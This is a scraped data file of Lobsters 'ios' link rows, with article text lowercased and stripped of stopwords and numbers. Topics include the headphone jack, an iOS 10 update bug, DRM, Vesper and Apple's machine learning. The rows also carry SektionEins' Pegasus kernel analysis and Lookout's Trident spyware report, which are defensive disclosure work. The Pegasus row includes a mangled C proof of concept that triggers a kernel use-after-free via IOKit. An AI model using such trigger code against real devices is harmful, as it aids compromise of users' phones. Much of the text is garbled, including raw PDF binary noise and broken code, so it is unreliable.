rewarded populism make lavish promise many cook one hand farage voter went one least bang courage
354,Lobsters,ios,Apple iOS,The bumpy road towards iPhone 5c NAND mirroring,http://arxiv.org/pdf/1609.04327v1,bumpy road towards iphone nand mirroring,,obj endobj obj endobj obj font procset pdftextimagebimagecimagei mediabox content rgroup tabssstructparents endobj obj stream n lkm k f n f b l w r qk r sz vcm l db b l s í hy vc f c jr …á x j g u l f r jv —í e j endstream endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj r endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj r endobj obj endobj obj endobj obj endobj obj font xobject procset pdftextimagebimagecimagei mediabox content rgroup tabssstructparents endobj obj stream w z b kœÜ q h ”∑gf knh z n r q h «ú b
355,Lobsters,ios,Apple iOS,"Courage (or, the mistake of the 3.5mm mini plug)",https://brandur.org/fragments/courage,courage mistake mini plug,fragment published sending pull request,waiting street corner seattle last weekend man box shoulder walked hah said motion towards nearby tent selling game counter figurine never seen anything like grown men playing little toy disdain dripped word whole life artist architect baker continued running supply bakery afterwards going go teach piano lesson expert musician see thirty year remarkable noted although every word mouth might truth possibility remote anyone developed mastery wide variety subject also likely developed sense humility go humility would tend restrict shameless selfaggrandizement unabashed belittlement peer two day ago phil schiller got stage talked removal mm headphone jack iphone reason move courage courage move something new better u said grandiose embellishment infamously characteristic apple removal mm jack mistake apple suggested replacement lightningcompatible wireless earphone lightning strange proprietary standard unlikely gain wide adoption even hold peripheral nearly securely mm jack make unsuitable movement exercise bluetooth technology work time remaining characterized mysterious inability connect playback interruption audio desyncing enough make maddening use borderline untenable add got new battery charge daily hard argue apple knocked u two rung ladder progress apologist point towards apple great historical track record making forward thinking choice example exclusion floppy disk drive serial port selective memory apple recent deprecation play macbook stripped magsafe usb thunderbolt could show world single usbc port enough anyone year half release computer still awkward use useful peripheral none apple fragmentcouragepublishedseptember find twitter make mistake please consider sending pull request
356,Lobsters,ios,Apple iOS,iOS 10 Over-the-Air Update Bricking Some iPhones and iPads,http://www.macrumors.com/2016/09/13/ios-10-update-bricking-iphones-and-ipads/,io overtheair update bricking iphones ipads,multiple report ipad pro affected given statement,new io update released today appears causing problem ipad iphone owner installing overtheair macrumors forum seeing multiple report user attempted install io device put recovery mode requiring restore seem limited single device report ipad owner coming ipad pro trouble new software release past multiple iphone model also appear affected including iphone iphone iphone se macrumors forum member bitbucket actual heck iphone bricked well make device screwed ota update try restore older version jailbreak preinstall update installed first time come apple appears since hit update right hit server somehow got corrupt install anyone else issue user io device bricked update may need itunes restore update fails erase data user iphones updated successfully itunes overtheair update failed nt needed restore successful user message user receiving problem iphone iphone requires updated restored problem may fixed updating iphone preserve setting content however updating nt work may necessary click restore era setting content backed iphone computer icloud prompted restore backup onto iphone light installation issue user facing concerned device sent recovery mode bricked hold downloading io update air time information uncovered appears io installs itunes affected remains viable method obtaining io update today ahead installing io either air itunes backup made update apple given statement issue caused io update fail air say fixed experienced brief issue software update process affecting small number user first hour availability problem quickly resolved apologize customer anyone affected connect itunes complete update contact applecare help
357,Lobsters,ios,Apple iOS,Analog: The Last Defense Against DRM,https://www.eff.org/deeplinks/2016/09/analog-last-defense-against-drm,analog last defense drm,already widely speculated new smartphone traditional analog headphone jack airplay lightning port move waterresistant iphone new pressure take advantage power apply pay licensing fee big content company would try take advantage control infamously pressured apple major medium company still eager find way decide device receive video hollywood major medium industry eager take advantage capability use new design restrict listening experience digital millennium copyright act protection drm,update earlier version blog post incorrectly suggested authorized audio device connector used lightning port existed prior yesterday announcement also implied way achieve lossless sound quality iphone wired connection also incorrect edited post accordingly recent iphone announcement apple confirmed already widely speculated new smartphone traditional analog headphone jack instead way connect phone external headset speaker via bluetooth phone airplay feature apple proprietary lightning port apple motivation abandoning analog jack opaque likely benign apple obsessed simple clean design move let company remove one piece clutter phone body decision may also part move waterresistant iphone certainly many people choose wireless listening experience removing port change substantial portion iphone owner listen audio simply plugging set headphone switching analog signal digital one apple potentially given control ever people music audio content iphone hope apple unwittingly opening door new pressure take advantage power plug audio cable smartphone work matter whether headphone made manufacturer phone even matter trying audio work whether cable going speaker mixing board recording device lightning port work differently manufacturer must apply pay licensing fee create lightningcompatible device rumor circulating iphone headphone jack colleague cory doctorow predicted big content company would try take advantage control right insistence drm would simply invite people wanted bypass legal reason use headphone jack get jack gone legal way get around drm word impossible connect speaker audio device iphone without apple software governing major medium company might pressure apple place limit apple customer use content u law protects digital right management drm technology may illegal circumvent potential restriction even completely lawful purpose would certainly precedent big content company infamously pressured apple incorporate drm itunes service itunes drm thing past fortunately drm audio downloads gone major medium company still eager find way control use content current debate fcc proposal unlock tv settop box tv film producer insisted able decide device receive video believe content industry leave audio alone output become entirely digital good news new iphone come lightning dongle provide standard mm analog port clear whether io specific apps able disable history suggests hollywood major medium industry eager take advantage capability also unclear whether iphone software able disable access mm port thirdparty device use credit card terminal blood pressure reader credit apple adamant use new design restrict listening experience therein lie problem depend manufacturer permission use hardware however like matter build peripheral accessory hardware determined limit technology manufacturer policy decision ultimately story apple company design decision digital millennium copyright act protection drm section dmca make illegal bypass drm give others mean give technology manufacturer power cast cloud legal uncertainty common us product give content owner powerful entity unfair weapon innovation others law need fixing
358,Lobsters,ios,Apple iOS,Apple Plug: Our lightest product ever.,http://appleplugs.com/,apple plug lightest product ever,vision upgrade iphone apple plug,vision upgrade iphone apple plug nt phone nt floppy drive nt headphone connector either made iphone world nt ready future apple plug perfect solution fill archaic headphone connector beautiful aluminium plug future
359,Lobsters,ios,Apple iOS,Apple September 7th event,http://www.apple.com/apple-events/september-2016/,apple september event,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
360,Lobsters,ios,Apple iOS,PEGASUS iOS Kernel Vulnerability Explained,https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html,pegasus io kernel vulnerability explained,intro released security update io patch analysis recently described mathew solnik blog post diaphora opensourceapplecom osunserializebinary osunserializebinary libkerncosserializebinarycpp vulnerability poc exploitation io kernel exploitation training course part part,sektioneins analysed apple io security patch find kernel vulnerability abused pegasus io malware intro august apple released security update io response discovery io surveillance toolkit dubbed pegasus unlike previously discovered io malware toolkit using three different io vulnerability compromise fully patched release io io device unfortunately public information vulnerability pretty thin citizenlab lookout party apple credit discovery apple decided keep public dark moment also shared sample malware general public independent party analysis possible sektioneins believe keeping public dark detail already fixed vulnerability actively exploited wild wrong decided take look security patch apple released order figure vulnerability abused pegasus specialised io kernel question dive kernel vulnerability reported today patch analysis unfortunately analysing io security patch straight forward one might hope io kernel stored device firmware file encrypted format order grab copy decrypted kernel therefore required either low level exploit allows decrypting kernel jailbreak io version question dump kernel memory sektioneins decided later use private jailbreak dump io io kernel io test device lab normally use method recently described mathew solnik blog post discloses fully decrypted io kernel dumped physical memory kernel exploit dumped two kernel analysed difference used open source binary diffing plugin diaphora ida perform task comparison loaded io kernel ida waited autoanalysis finish used diaphora dump current ida database sqlite database format diaphora us repeated process io kernel told diaphora diff two database result comparison visible following picture diaphora find function changed io however change change jump target list changed function becomes pretty clear interesting function seems osunserializexml analysing diff pretty hard function changed lot due reordering io io however analysis revealed function actually inlines another function finding vulnerability likely easier looking source code xnu pretty similar io kernel xnu kernel o x found opensourceapplecom looking code revealed inlined function actually osunserializebinary osobject osunserializexml const char buffer sizet buffersize osstring errorstring buffer return buffersize sizeof kosserializebinarysignature return strcmp kosserializebinarysignature buffer return osunserializebinary buffer buffersize errorstring xml must null terminated buffer buffersize return return osunserializexml buffer errorstring osunserializebinary osunserializebinary relatively new code added osunserializexml handle binary serialized data function therefore exposed user input way osunserializexml mean attacker abuse simply calling iokit api mach api function allow serialized argument eg simple iokit matching function also mean vulnerability triggered within sandbox used io o x source code new function located libkerncosserializebinarycpp therefore audited instead trying analyse exact patch apple applied binary format new serialized format complex consists bit identifier header followed bit aligned marker data object following data type supported dictionary array set number symbol string data boolean object reference previously deserialized object binary format encodes datatypes bit bit block lower bit reserved numeric data eg store length collection element counter bit mark last element collection data string symbol binary data number added four byte aligned datastream see poc listed example vulnerability spotting vulnerability turned pretty easy look similar use free vulnerability php function unserialize previously disclosed sektioneins folk phpnet vulnerability osunserialize stem cause deserializer create reference previously freed object deserialization whenever object deserialized get added table object code look like isref setatindex objs objsidx ok break objsidx unsafe mistake php setatindex macro increase reference counter object remembered see define setatindex v idx idx v capacity ncap v capacity typeof v array nbuf typeof v array kalloccontainer ncap sizeof nbuf ok false v array bcopy v array nbuf v capacity sizeof kfree v array v capacity sizeof v array nbuf v capacity ncap ok v array idx remember object without counting reference keeping track reference inside v array would problematic way legally free object deserialization unfortunately least one code path allows freeing object deserialization see code handling dictionary element support ossymbol osstring key however case osstring key get converted ossymbol followed destruction osstring object unfortunately time destruction osstring object already added objs object table dict sym debg sn sym getcstringnocopy getmetaclass getclassname dict ok dict setobject sym true release sym release sym else sym osdynamiccast ossymbol sym str osdynamiccast osstring sym ossymbol ossymbol withstring str release destruction osstring object already objs table ok sym possible simply use kosserializeobject data type create reference already destroyed osstring object classic use free vulnerability poc figured problem created simple poc trigger vulnerability see try o x vulnerable io simple poc trigger c copyright stefan esser sektioneins gmbh compile o x like gcc arch framework iokit ex exploitc include unistdh include stdlibh include stdioh include machmachh include iokitiokitlibh include iokitiokitmigh enum kosserializedictionary kosserializearray kosserializeset kosserializenumber kosserializesymbol kosserializestring kosserializedata kosserializeboolean kosserializeobject kosserializetypemask kosserializedatamask kosserializeendcollecton define kosserializebinarysignature int main char data malloc ptr data bufpos machportt master re kernreturnt kr create header memcpy data kosserializebinarysignature sizeof kosserializebinarysignature bufpos sizeof kosserializebinarysignature create dictionary element databufpos kosserializedictionary kosserializeendcollecton bufpos key osstring object databufpos kosserializestring bufpos databufpos bufpos databufpos bufpos data simple boolean databufpos kosserializeboolean bufpos create reference object osstring object freed databufpos kosserializeobject bufpos get master port iokit api hostgetiomaster machhostself master trigger bug kr ioservicegetmatchingservicesbin master data bufpos re printf kr xn kr exploitation analysed problem developed exploit vulnerability yet however implement fully working exploit vulnerability add io kernel exploitation training course later year berlin part blog post released information surfaced therefore nt miss part stefan esser
361,Lobsters,ios,Apple iOS,"Sophisticated, persistent mobile attack against high-value targets on iOS",https://blog.lookout.com/blog/2016/08/25/trident-pegasus/,sophisticated persistent mobile attack highvalue target io,overview pegasus spyware learn citizen lab tracked lookout focused technical detail read document tell impacted attack research team,persistent enterpriseclass spyware underestimated problem mobile device however targeted attack scenario highvalue mobile user real threat citizen lab munk school global affair university toronto lookout uncovered active threat using three critical io zeroday vulnerability exploited form attack chain subverts even apple strong security environment call vulnerability trident two organization worked directly apple security team responsive immediately fixed three trident io vulnerability patch individual update latest version io immediately unsure version running check setting general version lookout send alert customer phone time new update available lookout product also detect alert customer threat trident used spyware product called pegasus according investigation citizen lab developed organization called nso group nso group israelibased organization acquired u company francisco partner management according news report specializes cyber war pegasus highly advanced use zerodays obfuscation encryption kernellevel exploitation created two report discus use targeted attack political dissident provide detailed analysis malicious code report citizen lab detail attacker targeted human right defender mobile spyware providing evidence government digitally harass perceived enemy including activist journalist human right worker report lookout provides indepth technical look targeted espionage attack actively used io user throughout world overview ahmed mansoor internationally recognized human right defender martin ennals award laureate sometimes referred nobel prize human right based united arab emirate uae august received text message promising secret detainee tortured uae jail clicked included link instead clicking mansoor sent message citizen lab researcher recognizing link belonging exploit infrastructure connected nso group citizen lab collaborated lookout determine link led chain zeroday exploit would jailbroken mansoor iphone installed sophisticated malware mark third time mansoor targeted lawful intercept malware previous citizen lab research found targeted finfisher spyware hacking team spyware use expensive tool mansoor show length government willing go target activist citizen lab also found evidence statesponsored actor used nso exploit infrastructure mexican journalist reported corruption mexico head state unknown target target kenya nso group used fake domain impersonating site international committee red cross uk government visa application processing website wide range news organization major technology company nod toward targeted nature software pegasus spyware pegasus sophisticated attack seen endpoint take advantage integrated mobile device life combination feature available mobile always connected wifi voice communication camera email messaging gps password contact list modular allow customization us strong encryption evade detection lookout analysis determined malware exploit three zeroday vulnerability trident apple io information leak kernel kernel base mapping vulnerability leak information attacker allowing calculate kernel location memory kernel memory corruption lead jailbreak bit io kernellevel vulnerability allow attacker silently jailbreak device install surveillance software memory corruption webkit vulnerability safari webkit allows attacker compromise device user click link attack sequence boiled classic phishing scheme send text message open web browser load page exploit vulnerability install persistent software gather information however happens invisibly silently victim know compromised case software highly configurable depending country use feature set purchased user spyware capability include accessing message call email log apps including gmail facebook skype whatsapp viber facetime calendar line mailru wechat s tango others kit appears persist even device software updated update easily replace exploit become obsolete believe spyware wild significant amount time based indicator within code eg kernel mapping table value way back io also used attack highvalue target multiple purpose including highlevel corporate espionage io android blackberry learn report provide indepth information threat actor well software vulnerability exploited citizen lab tracked actor political exploit around world lookout focused technical detail malware beginning exploit chain use report include detailed analysis trident io vulnerability patched release apple well various component espionage software lookout customer read document tell impacted attack think encountered suspicious link one described email support lookoutcom research team citizen lab bill marczak john scottrailton senior fellow lookout max bazaliy andrew blaich kristy edward michael flossman seth hardy staff security researcher mike murray vp security research
362,Lobsters,ios,Apple iOS,"Vesper, Adieu",http://daringfireball.net/2016/08/vesper_adieu,vesper adieu,vesper adieu happened announced september glassboard fantastical tweetbot charles perry wrote kind piece building io version vesper size class miscellaneous point cloudkit announced wwdc cloudkit web service vesper free app store q branch yesterday,vesper adieu tuesday august happened december started company friend brent simmons dave wiskus named q branch june launched first product iphone note app called vesper yesterday announced development ceasing soon shutting sync server terribly sad love vesper use every day mean present tense still use pull plug sync server stop goto note app career thing done prouder writing daring fireball creation markdown went wrong simple never made enough money make enough money done differently make money complex question tackle actually sunk vesper complicated even relatively popular app relatively high price io revenue never high enough brent took job excellent omni group september point onward writing wall could probably shut vesper year ago loved much least started end brent still month go working glassboard dave spent time designing vesper iphone basic plan build vesper iphone sell around build sync system either top service like icloud dropbox rolling system build vesper mac sell around build vesper ipad maybe build web version would depend largely implemented syncing step hindsight convinced plan fundamentally flawed market paid productivity apps io simply difficult exception course fantastical tweetbot two example iphone first home screen paid apps io exception norm clearly free apps inapp purchase completely clear clear three year ago could would differently would start exact way dave designing vesper iphone brent wrote single line code would immediately design vesper product built shipped first downward pressure pricing mac apps market still quality apps cost plan would looked like build vesper mac sell around build sync system build vesper iphone build vesper ipad maybe build web version biggest advantage plan would think made far money step actually made vesper iphone first prove course could wrong pretty sure right would made big difference term revenue continue working turn vesper multiplatform system know time alternate schedule would also saved u lot work io introduced wwdc day shipped vesper many way vesper look feel ahead io curve charles perry wrote kind piece calling vesper first app io io appearance different even app like vesper designed many ideal needed thorough redesign spent summer building sync system rather building io version vesper built mac app first build vesper iphone twice io addition looking allnew introduced new architectural feature like size class preios era building ipad app like building second app could bundle together iphone version universal binary developer perspective nearly twice work started io might able natively support ipad day one io actual schedule might looked like build vesper mac sell around build sync system build vesper io native support iphone ipad maybe build web version firm believer always need good luck succeed would luckier timingwise done mac app first would able build io version io right start suffered enormous chickenandtheegg problem decision keep small team selffund effort revenue app note app interest many people available desktop mobile device number one reason long shot people buy vesper available mac get make total sense hell even cheat personally run vesper mac io simulator bottom line needed revenue first version built fund development next version think would made money mac version ultimately done version app mac io switch subscription model make apps free downloads platform charge somewhere around sync account industry going would sustainable io would solved free barrier people looking say iphone note app search app store note start downloading free apps find one seems good enough many free apps category like note paid one even never get look complaining way app store also entirely possible note app never going work financially bad idea getgo matter nicely designed app matter lovingly wellcrafted matter price point picked higher lower going work given well vesper firmly believe possible could made done differently convinced best chance would free mac io apps paid sync miscellaneous point asked let vesper vesper sync keep going biggest factor recurring cost primarily sync server losing money every month common comment seen since announcement yesterday something effect wish used icloud instead rolling sync service long story short thoroughly investigated icloud sync solution icloud offer needed never seen anyone say good thing icloud core data know developer simply nightmarish experience icloud core data cloudkit announced wwdc ship later year starting today bet wind using cloudkit also wanted keep option open webbased version vesper le likely still possible android window version possible cloudkit web service possible using icloud delineated many regret vesper creating sync system one right thing add vesper sync best sync system ever used fast reliable right moment started testing internally brag nothing entirely brent work vesper free app store ever curious reluctant pay might well check q branch quoted brent simmons yesterday loved working vesper one great softwaremaking experience life get roll wonderful hurt turn time short true really enjoyed working brent dave roll could tell good work fun spent better part career working solo great team remember came name q branch think brent vesper pretty sure one dave case soon name proposed whole team said yes name vesper thinking thing like beautiful smart clever strong end name apt knew also carry heartbreak
363,Lobsters,ios,Apple iOS,How AI and Machine Learning Work at Apple,https://backchannel.com/an-exclusive-look-at-how-ai-and-machine-learning-work-at-apple-8dbfb131932b,ai machine learning work apple,july steven levy sign course stanford well earlier month newton made point skynet though apple explaining turi apple snatched probably best measure several ai expert viv probably biggest issue helpful differential privacy wrote book clear machine learning,july siri brain transplantthree year earlier apple first major tech company integrate smart assistant operating system siri company adaptation standalone app purchased along team created initial review ecstatic next month year user became impatient shortcoming often erroneously interpreted command tweak fix itsteven levy founder get backchannel weekly newsletterso apple moved siri voice recognition neuralnet based system u user late july day went worldwide august previous technique remained operational keeping score home includes hidden markov model system leverage machine learning technique including deep neural network dnn convolutional neural network long shortterm memory unit gated recurrent unit ngrams glad asked user made upgrade siri still looked supercharged deep learningas typical underthehood advance may reveal thinking competitor apple publicize development user noticed fewer error fact apple say result improving accuracy stunningsenior vp internet software service eddy cue one thing jump significant test make sure somebody drop decimal place say eddy cue apple senior vice president internet software servicesthis story siri transformation revealed first time might raise eyebrow much artificial intelligence world neural net improved system course would apple quietly adept recently apple hiring ai field stepped company made highprofile acquisition observer viewed apple laggard shaping heated competition industry race best use powerful ai tool apple always tightlipped go behind badged door ai cognoscenti know apple machine learning part community say jerry kaplan teach course stanford history artificial intelligence apple nsa ai ai brahmin figured apple effort significant google facebook would heard google facebook microsoft top people machine learning say oren etzioni allen institute ai yes apple hired people five leader machine learning work apple apple speech recognition clear else machine learning help show product machine learning used missouri say etzioni actually israel show well earlier month apple show machine learning used product etzioni oren please read spent better part day boardroom one infinite loop cupertino headquarters getting core dump company activity ai machine learning top apple executive cue senior worldwide marketing vice president phil schiller senior vice president software engineering craig federighi well two key siri scientist sat handed dense twopage agenda listing machinelearningimbued apple product service one already shipping would discussthe message already player second nonebut wayif iphone user come across apple ai siri improved acumen figuring ask see phone identifies caller contact list email recently swipe screen get shortlist apps likely open next get reminder appointment never got around putting calendar map location pop hotel reserved type phone point parked car even though never asked technique either made possible greatly enhanced apple adoption deep learning neural netsyes apple brain already inside iphoneface recognition apple game neural net machine learning briefers say found apple product service apple us deep learning detect fraud apple store extend battery life charge device help identify useful feedback thousand report beta tester machine learning help apple choose news story determines whether apple watch user exercising simply perambulating recognizes face location photo figure whether would better leaving weak wifi signal switching cell network even know good filmmaking enabling apple quickly compile snapshot video minimovie touch button apple competitor many similar thing say executive none ai power pull thing protecting privacy closely apple course none make apple productsai new apple early using machine learning technique handwriting recognition product remember newton remnant effort still found today product convert handscrawled chinese character text recognize letterbyletter input apple watch user finger scribbling custom message watch face feature produced ml team engineer course earlier day machine learning primitive deep learning even buzzworded yet today ai technique rage apple bristle implication learning comparatively shallow recent week ceo tim cook made point mention company top leader elaboratingthe apple watch us machine learning fitnessrelated apps seeing last five year growth inside apple say phil schiller device getting much smarter quicker rate especially apple design series chip back end getting much smarter faster everything find reason connected enables machine learning technique much stuff learn available u even apple bearhugging machine learning executive caution embrace sense business usual cupertino illuminati view deep learning ml latest steady flow groundbreaking technology yes yes transformational advance like touch screen flat panel objectoriented programming apple view machine learning final frontier despite company say like technology year instrumental changing way interact device say cue one apple want even touch spookyscary speculation invariably come ai discussion expect apple confirm whether working selfdriving car version netflix team made pretty clear apple working skynet use technique thing always wanted better able say schiller new thing able technique ultimately apple way thing evolves inside apple way make product yet briefing unfolds becomes clear much ai already shaped overall experience using apple ecosystem view ai establishment apple constrained lack search engine deliver data help train neural network inflexible insistence protecting user information potentially denies apple data otherwise might use turn apple figured jump hurdleshow big brain dynamic cache enables machine learning iphone somewhat surprise asked apple provided information megabyte depending much personal information stored always deleting older data includes information app usage interaction people neural net processing speech modeler natural language event modeling also data used neural net power object recognition face recognition scene classificationand according apple done preference predilection peregrination privatethough apple explaining everything ai effort manage get resolution company distributes ml expertise around organization company machine learning talent shared throughout entire company available product team encouraged tap solve problem invent feature individual product single centralized organization temple ml apple say craig federighi try keep close team need apply deliver right user experience many people apple working machine learning lot say federighi prodding thought give number know apple interesting apple ml produced many people necessarily trained field joined company hire people smart fundamental domain mathematics statistic programming language cryptography say federighi turn lot kind core talent translate beautifully machine learning though today certainly hire many machine learning people also look people right core aptitude talent left senior vice president software engineering craig federighi listens siri senior director alex acero discus voice recognition software apple headquarters though federighi say approach might necessity apple penchant secrecy put disadvantage competitor encourage star computer scientist widely share research world practice tend reinforce natural selection bias interested working team deliver great product versus whose primary motivation publishing say federighi improving apple product scientist happen make breakthrough field great driven vision end result say cuesome talent field come acquisition recently buying company year relatively small really hiring manpower say cue apple buy ai company say big raw bunch machine learning researcher let build stable say federighi looking people talent really focused delivering great experience recent purchase turi seattle company apple snatched reported million built ml toolkit compared google tensorflow purchase fueled speculation apple would use similar purpose internally developer apple executive confirm deny certain thing matched well apple technology view people point view say cue year two may figure happened siri began showing predictive power cue relation eddy small startup apple snatched matter talent come apple ai infrastructure allows develop product feature would possible earlier mean altering company product road map apple end list really cool idea say schiller machine learning enabling u say yes thing past year would said becoming embedded process deciding product going next one example apple pencil work ipad pro order apple include version hightech stylus deal fact people wrote device bottom hand would invariably brush touch screen causing sort digital havoc using machine learning model palm rejection enabled screen sensor detect difference swipe touch pencil input high degree accuracy work rock solid good piece paper write anymore pencil good product say federighi love pencil thank machine learningprobably best measure apple machine learning progress come important ai acquisition date siri origin came ambitious darpa program intelligent assistant later scientist started company using technology create app steve job convinced founder sell apple directed siri built operating system launch highlight iphone event october working extend beyond instance user invoke holding home button simply uttering word hey siri feature make use machine learning allowing iphone keep ear without draining battery siri intelligence integrated apple brain work even keep mouth shutas far core product concerned cue cite four component product speech recognition understand talk natural language understanding grasp saying execution fulfill query request response talk back machine learning impacted hugely significant way sayssiri advanced development head tom gruber top siri speech guru alex acero siri head advanced development tom gruber came apple along original acquisition cofounder left introduction say even apple applied neural net siri scale user base providing data would key training net later steve said going go overnight pilot app hundred million user without beta program say sudden going user tell people say thing relevant app first revolution neural network came along siri transition neural net handling speech recognition got high gear arrival several ai expert including alex acero head speech team acero began career speech recognition apple early spent many year microsoft research loved published many paper say siri came said chance make deep neural network reality something hundred people read used million word type scientist apple seeking prioritizing product publishingwhen acero arrived three year ago apple still licensing much speech technology siri third party situation due change federighi note pattern apple repeat consistently becomes clear technology area critical ability deliver great product time build inhouse capability deliver experience want make great want innovate internally speech excellent example applied stuff available externally get ground team began training neural net replace siri original biggest baddest gpu graphic processing unit microprocessor farm cranking time say acero pump lot data july release proved cycle vain error rate cut factor two language factor two many case say acero mostly due deep learning way optimized algorithm context whole endtoend product endtoend reference telling apple first company use dnns speech recognition apple make argument control entire delivery system advantage apple make chip acero say able work directly silicon design team engineer write firmware device maximize performance neural net need siri team influenced even aspect iphone design silicon add federighi many microphone put device place microphone tune hardware mics software stack audio processing piece concert incredible advantage versus build software see happens another edge apple neural net work one product become core technology used purpose machine learning help siri understand becomes engine handle dictation instead typing result siri work people find message email likely coherent eschew soft keyboard instead click microphone key talkthe second siri component cue mentioned natural language understanding siri began using ml understand user intent november released version deeper learning year later speech recognition machine learning improved experience especially interpreting command flexibly example cue pull iphone invokes siri send jane twenty dollar square cash say screen display screen reflecting request try using little different language shoot twenty buck wife resultapple say without advance siri unlikely would produced current iteration apple tv distinguished sophisticated voice control earlier version siri forced speak constrained manner superchargedbydeeplearning version deliver specific choice vast catalog movie song also handle concept show good thriller tom hank siri really smart rule da vinci code able offer prior technology say federighiwith io scheduled full release fall siri voice becomes last four component transformed machine learning deep neural network replaced previously licensed implementation essentially siri remark come database recording collected voice center sentence stitchedtogether patchwork chunk machine learning say gruber smooth make siri sound like actual personacero demo first familiar siri voice robotic element become accustomed new one say hi sultry fluency made difference deep learning baby saysthough seems like small detail natural voice siri actually trigger big difference people feel trusting voice bit highquality say gruber better voice actually pull user use increasingreturns effect willingness use siri well improvement made machine learning becomes even important apple finally opening siri developer process apple critic noted long overdue many noted apple whose thirdparty siri partner number double figure way behind system like amazon alexa boast skill provided outsider developer apple say comparison hold amazon user use specific language access skill siri integrate thing like squarecash uber naturally say apple another competitor viv created siri cofounder also promise tight integration asyetunannounced launch date arrives meanwhile apple report improvement siri making difference people discover new feature find success familiar query number request continues grow grow say cue think need better job communicating thing instance love sport ask think going win game come back answer even know probably biggest issue apple adoption machine learning company succeed sticking principle user privacy company encrypts user information one even apple lawyer read fbi even warrant boast collecting user information advertising purposeswhile admirable user perspective apple rigor issue helpful luring top ai talent company machine learning expert want data say former apple employee working aicentric company privacy stance apple basically put one hand behind back argue whether right thing given apple reputation real hardcore ai folk view hotly contested apple executive say possible get data need robust machine learning without keeping profile user cloud even storing instance behavior train neural net false narrative false tradeoff say federighi great would known uniquely respecting user privacy sake user everywhere like show way rest industry get board two issue involved first involves processing personal information machinelearning based system detail user gleaned neuralnet processing happens information second issue involves gathering information required train neuralnets recognize behavior without collecting personal information user apple say answer people perceive thing ai data say cue found way get data need still maintaining privacy bottom line apple handle first issue protecting personal preference information neural net identify taking advantage unique control software hardware put simply personal stuff stay inside apple brain keep sensitive thing ml occurring entirely local device federighi say example cite app suggestion icon appear swipe right ideally exactly apps intended open next prediction based number factor many involving behavior one business work federighi say percent time people find need prediction apple computing right phoneother information apple store device includes probably personal data apple capture word people type using standard iphone quicktype keyboard using neural networktrained system watch type apple detect key event item like flight information contact appointment information stay phone even backup stored apple cloud information distilled way inferred backup alone want information stored apple server say federighi need apple corporation need know habit go apple also try minimize information kept general federighi mention example might conversation someone mention term potential search company might analyze whole conversation cloud identify term say apple device detect without data leave user possession system constantly looking match knowledge base kept phone part megabyte brain compact quite thorough knowledge base hundred thousand location entity localize know say federighi knowledge base tapped apple apps including spotlight search app map safari help autocorrect working continuously background saysthe question come machine learning circle though whether apple privacy restriction hobble neural net algorithm aforementioned second issue neural net need massive amount data sufficiently trained accuracy apple suck user behavior get data many company apple train net publicly available corpus information data set stock image photo recognition instance sometimes need current specific information could come user base apple try get information without knowing user anonymizes data tagging random identifier associated apple idsbeginning io apple also employ relatively new technique called differential privacy basically crowdsources information way identify individual example use might surface newly popular word apple knowledge base vocabulary link suddenly emerge relevant answer query surge usage certain emojis traditional way industry solves problem send every word type every character type server trawl spot interesting thing say federighi endtoend encryption though differential privacy hatched research community apple taking step apply massive scale taking research billion user say cue started working year ago done really interesting work practical scale explains federighi pretty crazy private describes system involves virtual cointossing cryptographic protocol barely could follow wrote book cryptography basically adding mathematical noise certain piece data apple detect usage pattern without identifying individual user say apple contribution sufficiently significant valuable world large authorizing scientist working implementation publish paper workwhile clear machine learning changed apple product clear whether changing apple sense machine learning mindset seems odds apple ethos apple company carefully control user experience sensor measure swipe everything predesigned precisely coded engineer use machine learning must step back let software discover solution apple adjust modern reality machine learning system hand product design source lot internal debate say federighi used delivering wellthoughtout curated experience control dimension system going interact user start training system based large data set human behavior result emerge necessarily apple designer specified emerged data apple turning back say schiller technique absolutely affect design something end day using enable u deliver higher quality product takeaway apple may make declaration going allin machine learning company use much possible improve product brain inside phone proof typical customer going experience deep learning daytoday level exemplifies love apple product say schiller exciting instance subtle even think third time see stop say happening skynet wait
364,Lobsters,ios,Apple iOS,Introducing OpenStreetView,https://www.openstreetmap.org/user/mvexel/diary/39274,introducing openstreetview,minute talk see talk sotm workshop openstreetview component openstreetvieworg open source web site apps apk osm wiki sign detection josm plugin github hello openstreetvieworg twitter upload tool openstreetview,almost year thinking development testing osm team telenav ready present openstreetview osm mapper openstreetview osv free open street level imagery platform designed osm mapper mind officially presented osv osm community state map u minute talk booth gave away crazy little remote controlled car everyone signed car gone quickly almost half people sotm u signed still see talk thanks great sotm u organizer session professionally recorded minute like reading watching video going best way introduced osv use improve osm coming sotm brussels come meet team remote controlled car know attend workshop openstreetview booth sotm u prefer reading read wanted quickly introduce osv component believe choice street level imagery osm course contribute use openstreetview component osv web site openstreetvieworg free open source mobile apps android io specialized map editor plugin josm course back end server support id also planned web site go explore imagery world see leaderboards profile trip see personal stuff course need sign openstreetview account linked osm account need create separate account store sign first time whatever public osm want check go http changing whatever osm id unless want see detail apps free download play app store android also download apk directly apps capture trip optimized driving also work well biking walking scenario apart recording trip also upload trip osv happen automatically enter wifi want finally review local server trip see profile even logged web site log osv apps also osm oauth either way create account osv one thing really specific osv link app dongle car little device read port car almost every car one challenge find dongle read kind diagnostic info car broadcast bluetooth wifi cost around euro list osv compatible one osm wiki ehm small list far different model please add experience osv read speed curve improve accuracy gps signal recorded trip come extrememly handy gps reception poor lost altogether example dense tree cover tunnel dead reckoning provided unit maintain proper alignment road see mean driving tunnel blue gps signal lost red connection osv apps also sign detection built done server client mean detect speed limit sign come real time warn speeding warning feature almost ready one next build update apps frequently josm plugin early beta stage right simply display location image osv server click show image osv panel basic functionality work hope idea even code improve speaking idea already active community reporting issue suggestion github best place let u know bug idea part osv github also source code component mentioned located almost everything osv open source looking make open source like github want create account also write hello openstreetvieworg idea bug report also twitter openstreetview getting facebook instagram kind thing check github see also upload tool existing virb gopro action camera image python script also gui tool drag drop directory onto upload early beta want copy let know two component mentioned yet map editor back end want save separate post write soon screenshot map editor openstreetview think openstreetview choice street level imagery osm almost completely open source also remain full control data upload osv always delete individual photo trip even delete everything remove account moment want part osv longer option web site need email anyone submit request another reason building platform tightly integrated osm obvious way handle user account log osm separate account also deeper integration osm tight map trip osm way link back forth trip image osm way object open kind interesting possibility want spend separate post well would cool would give openstreetview try download app phone sign start capturing tell u experience explore already important please use improve osm note openstreetview project run openstreetmap openstreetmap 